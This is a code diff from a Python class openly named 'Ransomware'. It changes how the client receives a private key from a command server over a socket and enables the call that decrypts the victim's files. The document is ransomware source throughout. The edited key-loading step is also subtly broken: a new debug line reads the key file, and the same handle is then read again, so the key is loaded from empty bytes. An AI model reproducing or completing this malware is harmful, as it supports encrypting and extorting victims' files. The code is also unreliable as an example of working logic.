@@ -333,12 +333,13 @@ class Ransomware:
                 print(f"[RECV] Receiving the private key")
                 print("filename: " + filename)
 
-                key = open(filename, "w")
+                key = open(filename, "wb")
                 self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
     
                 """ Receiving the private key from the server. """
-                data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
                 print(data)
+                print(type(data))
                 key.write(data)
             
                 print(f"[RECV] Receiving the private key data.")
@@ -351,9 +352,10 @@ class Ransomware:
                 #Read the private key from the server
                 #I am not sure where to put this above, so I will leave it here for now
                 with open("private_key.pem", "rb") as key_content:
+                    print(key_content.read())
                     key = rsa.PrivateKey.load_pkcs1(key_content.read())
-            
-                # self.decrypt_all_files(home, key)
+
+                self.decrypt_all_files(home, key)
             
                 #TODO: Implement code to delete all the files that are stored on the server
 
